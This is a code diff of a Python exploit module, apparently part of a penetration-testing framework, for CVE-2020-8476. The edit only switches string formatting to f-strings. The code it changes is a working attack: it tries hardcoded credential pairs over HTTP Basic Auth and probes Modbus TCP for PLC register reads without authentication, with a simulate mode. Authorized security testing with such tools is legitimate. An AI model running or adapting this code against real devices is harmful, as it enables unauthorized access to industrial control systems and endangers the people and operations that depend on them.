@@ -78,14 +78,14 @@ def _modbus_read(target: str, port: int, timeout: int) -> bool:
 def _http_basic_auth(target: str, port: int, username: str, password: str, timeout: int) -> int:
     """Try HTTP Basic Auth. Return HTTP status code."""
     import base64
-    token = base64.b64encode("{}:{}".format(username, password).encode()).decode()
+    token = base64.b64encode(f"{username}:{password}".encode()).decode()
     request = (
         "GET / HTTP/1.0\r\n"
-        "Host: {}\r\n"
-        "Authorization: Basic {}\r\n"
+        f"Host: {target}\r\n"
+        f"Authorization: Basic {token}\r\n"
         "Connection: close\r\n"
         "\r\n"
-    ).format(target, token).encode()
+    ).encode()
 
     try:
         sock = socket.create_connection((target, port), timeout=timeout)
@@ -170,11 +170,8 @@ class Exploit(Exploit):
 
         if self.simulate:
             print_status(
-                "[CVE-2020-8476] SIMULATE: Would test {} credential pairs against "
-                "{}:{} (HTTP Basic Auth) and {}:{} (Modbus).".format(
-                    len(_HARDCODED_CREDS), self.target, self.port,
-                    self.target, self.modbus_port,
-                )
+                f"[CVE-2020-8476] SIMULATE: Would test {len(_HARDCODED_CREDS)} credential pairs against "
+                f"{self.target}:{self.port} (HTTP Basic Auth) and {self.target}:{self.modbus_port} (Modbus)."
             )
             print_info("[CVE-2020-8476] Known hardcoded credential pairs:")
             for u, p in _HARDCODED_CREDS[:5]:
@@ -186,20 +183,14 @@ class Exploit(Exploit):
             )
             return
 
-        print_status("[CVE-2020-8476] Checking Modbus accessibility on {}:{}...".format(
-            self.target, self.modbus_port
-        ))
+        print_status(f"[CVE-2020-8476] Checking Modbus accessibility on {self.target}:{self.modbus_port}...")
         if _modbus_read(self.target, self.modbus_port, self.timeout):
             print_success(
-                "[CVE-2020-8476] Modbus TCP accessible on {}:{} — "
-                "PLC register read without authentication.".format(
-                    self.target, self.modbus_port
-                )
+                f"[CVE-2020-8476] Modbus TCP accessible on {self.target}:{self.modbus_port} — "
+                "PLC register read without authentication."
             )
 
-        print_status("[CVE-2020-8476] Testing {} credential pairs on {}:{}...".format(
-            len(_HARDCODED_CREDS), self.target, self.port
-        ))
+        print_status(f"[CVE-2020-8476] Testing {len(_HARDCODED_CREDS)} credential pairs on {self.target}:{self.port}...")
         found = False
         for username, password in _HARDCODED_CREDS:
             code = _http_basic_auth(self.target, self.port, username, password, self.timeout)
